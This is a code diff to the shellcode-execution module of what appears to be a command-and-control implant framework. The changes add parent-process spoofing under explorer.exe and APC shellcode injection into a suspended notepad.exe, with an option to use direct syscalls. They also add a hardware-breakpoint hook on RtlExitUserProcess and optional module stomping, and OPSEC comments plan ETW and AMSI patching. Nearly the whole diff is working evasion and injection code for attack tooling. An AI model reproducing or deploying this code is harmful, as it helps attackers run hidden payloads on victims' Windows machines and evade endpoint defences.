@@ -59,7 +59,10 @@ AssemblyExec::AssemblyExec()
 #endif
 {
 	m_processToSpawn="";
+	m_spoofedParent="";
 	m_useSyscall=false;
+	m_isModeProcess = true;
+	m_isSpoofParent = false;
 }
 
 AssemblyExec::~AssemblyExec()
@@ -77,6 +80,7 @@ std::string AssemblyExec::getInfo()
 	info += "Use -r to use a shellcode file.\n";
 	info += "If -e or -d are given, use donut to create the shellcode.\n";
 	info += "exemple:\n";
+	info += "- assemblyExec thread/process/processWithSpoofedParent\n";
 	info += "- assemblyExec -r ./shellcode.bin\n";
 	info += "- assemblyExec -e ./program.exe arg1 arg2...\n";
 	info += "- assemblyExec -e ./Seatbelt.exe -group=system\n";
@@ -86,10 +90,43 @@ std::string AssemblyExec::getInfo()
 }
 
 
+#define modeThread "0"
+#define modeProcess "1"
+#define modeprocessWithSpoofedParent "2"
+
+
 int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
-	if (splitedCmd.size() >= 3)
+	if(splitedCmd.size() == 2)
+	{
+		if(splitedCmd[1]=="thread")
+		{
+			m_isModeProcess = false;
+			c2Message.set_returnvalue("thread mode.\n");
+			return -1;
+		}
+		else if(splitedCmd[1]=="process")
+		{
+			m_isModeProcess = true;
+			m_isSpoofParent = false;
+			c2Message.set_returnvalue("process mode.\n");
+			return -1;
+		}
+		else if(splitedCmd[1]=="processWithSpoofedParent")
+		{
+			m_isModeProcess = true;
+			m_isSpoofParent = true;
+			c2Message.set_returnvalue("process mode with parent spoofing.\n");
+			return -1;
+		}
+		else
+		{
+			c2Message.set_returnvalue(getInfo());
+			return -1;
+		}
+	}
+	else if (splitedCmd.size() >= 3)
 	{
 		bool donut=false;
 		std::string inputFile=splitedCmd[2];
@@ -167,8 +204,6 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 			// if we create a process we need to exite process with donut shellcode
 			// Otherwise we exite the thread
 			creatShellCodeDonut(inputFile, method, args, payload, true);
-
-			// creatShellCodeDonut(inputFile, method, args, payload, false);
 		}
 		else
 		{
@@ -190,6 +225,13 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 			cmd+=splitedCmd[idx];
 			cmd+=" ";
 		}
+
+		if(m_isModeProcess == false)
+			c2Message.set_args(modeThread);
+		else if(m_isModeProcess == true && m_isSpoofParent == false)
+			c2Message.set_args(modeProcess);
+		else if(m_isModeProcess == true && m_isSpoofParent == true)
+			c2Message.set_args(modeprocessWithSpoofedParent);
 
 		c2Message.set_pid(pid);
 		c2Message.set_cmd(cmd);
@@ -215,7 +257,13 @@ int AssemblyExec::initConfig(const nlohmann::json &config)
 			m_processToSpawn = it.value();
 		else if(it.key()=="syscall")
 			m_useSyscall = true;
-			
+		else if(it.key()=="isModeProcess")
+			m_isModeProcess = (bool)it.value();
+		else if(it.key()=="spoofedParent")
+		{
+			m_isSpoofParent = true;
+			m_spoofedParent = it.value();
+		}			
 	}
 
 	return 0;
@@ -224,12 +272,62 @@ int AssemblyExec::initConfig(const nlohmann::json &config)
 
 int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
+	std::string mode = c2Message.args();
+	if(!mode.empty())
+	{
+		if(mode==modeThread)
+			m_isModeProcess = false;
+		else if(mode==modeProcess)
+		{
+			m_isModeProcess = true;
+			m_isSpoofParent = false;
+		}
+		else if(mode==modeprocessWithSpoofedParent)
+		{
+			m_isModeProcess = true;
+			m_isSpoofParent = true;
+		}
+	}
+
 	const std::string payload = c2Message.data();
 
 	std::string result;
 
 #ifdef __linux__
 
+	whateverLinux(payload, result);
+
+#elif _WIN32
+
+	std::string processToSpawn="notepad.exe";
+	std::string spoofedParent="explorer.exe";
+	if(!m_processToSpawn.empty())
+		processToSpawn=m_processToSpawn;
+	if(!m_spoofedParent.empty())
+		spoofedParent=m_spoofedParent;
+
+	if(m_isModeProcess && !m_isSpoofParent)
+		createNewProcess(payload, processToSpawn, result);
+	else if(m_isModeProcess && m_isSpoofParent)
+		createNewProcessWithSpoofedParent(payload, processToSpawn, spoofedParent, result);
+	else
+		createNewThread(payload, result);
+
+#endif
+
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
+	c2RetMessage.set_cmd(c2Message.cmd());
+	c2RetMessage.set_returnvalue(result);
+	
+	return 0;
+}
+
+
+#ifdef __linux__
+
+
+int AssemblyExec::whateverLinux(const std::string& payload, std::string& result)
+{
 	if(1)
 	{
 		pid_t pid = 0;
@@ -311,32 +409,63 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 		mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
 		((void(*)())page)();
 	}
+}
+
 
 #elif _WIN32
 
-	bool isInjectIntoNewProcess=true;
-	std::string processToSpawn="notepad.exe";
-	if(!m_processToSpawn.empty())
-		processToSpawn=m_processToSpawn;
 
-	// if we create a process we need to exite process with donut shellcode
-	if(isInjectIntoNewProcess)
-		createNewProcess(payload, processToSpawn, result);
-
-	// Otherwise we exite the thread
-	else
-		createNewThread(payload, result);
-
-#endif
-
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
-	c2RetMessage.set_cmd(c2Message.cmd());
-	c2RetMessage.set_returnvalue(result);
-	
-	return 0;
+LONG WINAPI handlerRtlExitUserProcess(EXCEPTION_POINTERS * ExceptionInfo) 
+{
+	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
+	{
+		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
+		if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
+		{
+			// printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
+			// printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
+			// printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
+			// printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
+			// printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
+			// printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
+			
+			// printf("RtlExitUserProcess called!\n");
+			
+			// continue the execution
+			ExceptionInfo->ContextRecord->EFlags |= (1 << 16);			// set RF (Resume Flag) to continue execution
+			//ExceptionInfo->ContextRecord->Rip++;						// or skip the breakpoint via instruction pointer
+			ExceptionInfo->ContextRecord->Rip = (DWORD64)GetProcAddress(GetModuleHandle("Kernel32.dll"), "ExitThread");
+		}		
+		return EXCEPTION_CONTINUE_EXECUTION;
+	}
+	return EXCEPTION_CONTINUE_SEARCH;
 }
 
-#ifdef _WIN32
+
+int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP) 
+{
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_ALL;
+
+	GetThreadContext(thrd, &ctx);
+	
+	if (setBP == TRUE) {
+		ctx.Dr0 = addr;
+		ctx.Dr7 |= (1 << 0);  		// Local DR0 breakpoint
+		ctx.Dr7 &= ~(1 << 16);		// break on execution
+		ctx.Dr7 &= ~(1 << 17);
+
+	}
+	else if (setBP == FALSE) {
+		ctx.Dr0 = NULL;
+		ctx.Dr7 &= ~(1 << 0);
+	}
+
+	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;	
+	SetThreadContext(thrd, &ctx);
+
+	return 0;
+}
 
 
 // Create new thread to run the shellcode, the memory use to inject the payload is taken from a DLL (Module Stomping)
@@ -346,19 +475,38 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 	StdCapture stdCapture;
 	stdCapture.BeginCapture();
 
+	char * ptr;
+	
 	// Module stomping
-	unsigned char sLib[] = "HologramWorld.dll";
-	HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
-	char * ptr = (char *) hVictimLib + 2*4096 + 12;
+	bool isModuleStomping = false;
+	if(isModuleStomping)
+	{
+		unsigned char sLib[] = "HologramWorld.dll";
+		HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
+		ptr = (char *) hVictimLib + 2*4096 + 12;
 
-	// Alloc memory
-	// char * ptr = (char *) VirtualAlloc(NULL, payload.size()+4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		DWORD oldprotect = 0;
+		VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_READWRITE, &oldprotect);
+		RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
+	    VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_EXECUTE_READ, &oldprotect);
+	}
+	else
+	{
+		DWORD oldprotect = 0;
+		ptr = (char *) VirtualAlloc(NULL, payload.size()+4096, MEM_COMMIT, PAGE_READWRITE);
+		RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
+	    VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_EXECUTE_READ, &oldprotect);
+	}
+	
+	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, CREATE_SUSPENDED, 0);
 
-	DWORD oldprotect = 0;
-	VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_READWRITE, &oldprotect);
-	RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
-	VirtualProtect((char *) ptr, payload.size() + 4096, oldprotect, &oldprotect);
-	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
+	AddVectoredExceptionHandler(0, &handlerRtlExitUserProcess);
+	BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
+	DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);
+	SetHWBP(thread, (DWORD64) dword64Address, TRUE);
+
+	if (thread != NULL) 
+		ResumeThread(thread);
 
 	WaitForSingleObject(thread, maxDurationShellCode*1000);
 
@@ -368,14 +516,273 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 	return 0;
 }
 
-// OPSEC use syscall for injection
+
+// OPSEC function to switch to syscall
 // OPSEC patch etw et amsi
-// OPSEC choose the process as an argument
-// OPSEC in CS the sacrificial process communicate with PIPE, name or anonymous like here ?
-// OPSEC parent process spoofing
-// OPSEC wipe memory of the shellcode in the remote process at the end
+// 		 difficulte to do with the fact that we create the thread suspended and so the lib are not loaded yet.
+// OPSEC function to choose the process to inject to
+
+
+DWORD GetPidByName(const char * pName) 
+{
+	PROCESSENTRY32 pEntry;
+	HANDLE snapshot;
+
+	pEntry.dwSize = sizeof(PROCESSENTRY32);
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (Process32First(snapshot, &pEntry) == TRUE) 
+	{
+		while (Process32Next(snapshot, &pEntry) == TRUE) 
+		{
+			if (_stricmp(pEntry.szExeFile, pName) == 0) 
+			{
+				return pEntry.th32ProcessID;
+			}
+		}
+	}
+	CloseHandle(snapshot);
+	return 0;
+}
+
 
 // Create a new process in suspended mode to run the shellcode.
+int AssemblyExec::createNewProcessWithSpoofedParent(const std::string& payload, const std::string& processToSpawn, const std::string& spoofedParent, std::string& result)
+{
+	// Init handles
+	HANDLE hChildStdOutRd = NULL;
+	HANDLE hChildStdOutWr = NULL;
+	HANDLE hChildStdErrRd = NULL;
+	HANDLE hChildStdErrWr = NULL;
+	HANDLE hParentStdOutWr = NULL;
+	HANDLE hParentStdErrWr = NULL;
+
+	// Set the bInheritHandle flag so pipe handles are inherited. 
+	SECURITY_ATTRIBUTES sa; 
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
+    sa.bInheritHandle = TRUE; 
+    sa.lpSecurityDescriptor = NULL; 
+    
+    CreatePipe(&hChildStdErrRd, &hChildStdErrWr, &sa, 0);
+	SetHandleInformation(hChildStdErrRd, HANDLE_FLAG_INHERIT, 0);
+
+	// std::string pipeStdErr = "\\\\.\\pipe\\error";
+	// int bufferSize = 512;
+	// hChildStdErrRd = CreateNamedPipeA(pipeStdErr.c_str(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, bufferSize, bufferSize, 0, &sa);
+	// hChildStdErrWr = CreateFileA(pipeStdErr.c_str(), GENERIC_READ | GENERIC_WRITE, 0, &sa, OPEN_EXISTING, 0, NULL); 
+
+	// hChildStdErrWr = CreateFile("C:\\Users\\CyberVuln\\Desktop\\err.log", FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
+
+	CreatePipe(&hChildStdOutRd, &hChildStdOutWr, &sa, 0);
+	SetHandleInformation(hChildStdOutRd, HANDLE_FLAG_INHERIT, 0);
+
+	// std::string pipeStdOut = "\\\\.\\pipe\\output";
+	// hChildStdOutRd = CreateNamedPipeA(pipeStdOut.c_str(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, bufferSize, bufferSize, 0, &sa);
+	// hChildStdOutWr = CreateFileA(pipeStdOut.c_str(), GENERIC_READ | GENERIC_WRITE, 0, &sa, OPEN_EXISTING, 0, NULL); 
+	    
+    // Prepare the parent child spoofing
+	DWORD dwPid = 0;
+	dwPid = GetPidByName(spoofedParent.c_str());
+	if (dwPid == 0)
+		dwPid = GetCurrentProcessId();
+
+    HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+	if (!hParentProcess) 
+	{
+		// result += "Error: Failed to open parent process." << GetLastError() << "\n";
+        return 0;
+    }
+
+	// Duplicate handles to the spoofed parent process
+	BOOL res = DuplicateHandle(GetCurrentProcess(), hChildStdOutWr, hParentProcess, &hParentStdOutWr, 0, TRUE, DUPLICATE_SAME_ACCESS);
+	res = DuplicateHandle(GetCurrentProcess(), hChildStdErrWr, hParentProcess, &hParentStdErrWr, 0, TRUE, DUPLICATE_SAME_ACCESS);
+
+    // Set up members of the STARTUPINFOEX structure to specifies the STDERR and STDOUT handles for redirection.
+	STARTUPINFOEX siStartInfo = {};
+    siStartInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
+    siStartInfo.StartupInfo.hStdError = hParentStdErrWr;
+    siStartInfo.StartupInfo.hStdOutput = hParentStdOutWr;
+    siStartInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+	// Set up attributeList to set up the parent process
+    SIZE_T attributeListSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
+
+    PPROC_THREAD_ATTRIBUTE_LIST  attributeList = (PPROC_THREAD_ATTRIBUTE_LIST )HeapAlloc(GetProcessHeap(), 0, attributeListSize);
+    if (!attributeList) 
+	{
+		// result += "Error: Failed to allocate memory for attribute list." << GetLastError() << "\n";
+
+		CloseHandle(hChildStdErrWr);
+		CloseHandle(hChildStdOutWr);
+		CloseHandle(hChildStdErrRd);
+		CloseHandle(hChildStdOutRd);
+		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		CloseHandle(hParentProcess);
+
+        return 0;
+    }
+
+    if (!InitializeProcThreadAttributeList(attributeList, 1, 0, &attributeListSize)) 
+	{
+		// result += "Error: Failed to initialize attribute list." << GetLastError() << "\n";
+		
+        HeapFree(GetProcessHeap(), 0, attributeList);
+
+		CloseHandle(hChildStdErrWr);
+		CloseHandle(hChildStdOutWr);
+		CloseHandle(hChildStdErrRd);
+		CloseHandle(hChildStdOutRd);
+		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		CloseHandle(hParentProcess);
+
+        return 0;
+    }
+
+    if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) 
+	{
+		// result += "Error: Failed to set parent process attribute." << GetLastError() << "\n";
+
+        DeleteProcThreadAttributeList(attributeList);
+        HeapFree(GetProcessHeap(), 0, attributeList);
+
+		CloseHandle(hChildStdErrWr);
+		CloseHandle(hChildStdOutWr);
+		CloseHandle(hChildStdErrRd);
+		CloseHandle(hChildStdOutRd);
+		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		CloseHandle(hParentProcess);
+
+        return 0;
+    }
+
+	siStartInfo.lpAttributeList = attributeList;
+
+    // Create the child process
+	PROCESS_INFORMATION piProcInfo; 
+	ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
+	bool bSuccess = CreateProcessA(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siStartInfo.StartupInfo, &piProcInfo);
+
+    DeleteProcThreadAttributeList(attributeList);
+	HeapFree(GetProcessHeap(), 0, attributeList);
+
+    // If an error occurs, exit the application. 
+    if ( ! bSuccess ) 
+	{
+		CloseHandle(hChildStdErrWr);
+		CloseHandle(hChildStdOutWr);
+		CloseHandle(hChildStdErrRd);
+		CloseHandle(hChildStdOutRd);
+		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+		CloseHandle(hParentProcess);
+
+		// result += "Error: Process failed to start." << GetLastError() << "\n";
+		return -1;
+    }
+
+	PVOID remoteBuffer;
+	if(m_useSyscall)
+	{
+		// https://github.com/0xrob/XOR-Shellcode-QueueUserAPC-Syscall/blob/main/queueUserAPC-XOR/Source.cpp
+		SIZE_T sizeToAlloc = payload.size();
+
+		Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+		
+		ULONG oldAccess;
+		Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
+
+		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
+		Sw3NtResumeThread_(piProcInfo.hThread, NULL);
+	}
+	else
+	{
+		remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+
+		WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
+
+		DWORD oldprotect = 0;
+		VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
+
+		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
+		QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
+		ResumeThread(piProcInfo.hThread);
+	}
+
+	m_isProcessRuning=true;
+	m_processHandle = piProcInfo.hProcess;
+	std::thread thread([this] { killProcess(); });
+
+	WaitForSingleObject(piProcInfo.hProcess, INFINITE);
+
+	CloseHandle(hChildStdErrWr);
+    CloseHandle(hChildStdOutWr);
+	DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+	DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+
+	DWORD dwRead; 
+    CHAR chBuf[BUFSIZE];
+    bSuccess = FALSE;
+    std::string out = "";
+	std::string err = "";
+    for (;;) 
+	{ 
+		DWORD bytesAvailable = 0;
+		if (PeekNamedPipe(hChildStdOutRd, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) 
+		{
+			bSuccess=ReadFile( hChildStdOutRd, chBuf, BUFSIZE, &dwRead, NULL);
+			if( ! bSuccess || dwRead == 0 ) 
+				break; 
+
+			std::string s(chBuf, dwRead);
+			out += s;
+		}
+		if (PeekNamedPipe(hChildStdErrRd, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) 
+		{
+			bSuccess=ReadFile( hChildStdErrRd, chBuf, BUFSIZE, &dwRead, NULL);
+			if( ! bSuccess || dwRead == 0 ) 
+				break; 
+
+			std::string s(chBuf, dwRead);
+			err += s;
+		}
+		DWORD exitCode;
+		if (GetExitCodeProcess(piProcInfo.hProcess, &exitCode) && exitCode != STILL_ACTIVE)
+        	break;
+		// std::this_thread::sleep_for(std::chrono::milliseconds(5));
+    } 
+
+	m_isProcessRuning = false;
+
+	CloseHandle(hChildStdErrRd);
+    CloseHandle(hChildStdOutRd);
+
+	CloseHandle(hParentProcess);
+
+	thread.join();
+
+	result += "Stdout:\n";
+	result += out;
+	result += "\n";
+	if(!err.empty())
+	{
+		result += "Stderr:\n";
+		result += err;
+		result += "\n";
+	}
+
+	CloseHandle(piProcInfo.hProcess);
+	CloseHandle(piProcInfo.hThread);
+
+	return 0;
+}
+
+
 int AssemblyExec::createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result)
 {
 	HANDLE g_hChildStd_OUT_Rd = NULL;
@@ -471,27 +878,41 @@ int AssemblyExec::createNewProcess(const std::string& payload, const std::string
 	m_processHandle = piProcInfo.hProcess;
 	std::thread thread([this] { killProcess(); });
 
+	WaitForSingleObject(piProcInfo.hProcess, INFINITE);
+
 	DWORD dwRead; 
     CHAR chBuf[BUFSIZE];
     bSuccess = FALSE;
     std::string out = "";
 	std::string err = "";
-    for (;;) { 
-        bSuccess=ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
-        if( ! bSuccess || dwRead == 0 ) break; 
+    for (;;) 
+	{ 
+		DWORD bytesAvailable = 0;
+		if (PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) 
+		{
+			bSuccess=ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
+			if( ! bSuccess || dwRead == 0 ) 
+				break; 
 
-        std::string s(chBuf, dwRead);
-        out += s;
+			std::string s(chBuf, dwRead);
+			out += s;
+		}
+		if (PeekNamedPipe(g_hChildStd_ERR_Rd, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) 
+		{
+			bSuccess=ReadFile( g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, NULL);
+			if( ! bSuccess || dwRead == 0 ) 
+				break; 
+
+			std::string s(chBuf, dwRead);
+			err += s;
+		}
+		DWORD exitCode;
+		if (GetExitCodeProcess(piProcInfo.hProcess, &exitCode) && exitCode != STILL_ACTIVE)
+        	break;
+
+		// std::this_thread::sleep_for(std::chrono::milliseconds(5));
     } 
-    dwRead = 0;
-    for (;;) { 
-        bSuccess=ReadFile( g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, NULL);
-        if( ! bSuccess || dwRead == 0 ) break; 
 
-        std::string s(chBuf, dwRead);
-        err += s;
-
-    } 
 	m_isProcessRuning = false;
 	CloseHandle(g_hChildStd_ERR_Rd);
     CloseHandle(g_hChildStd_OUT_Rd);
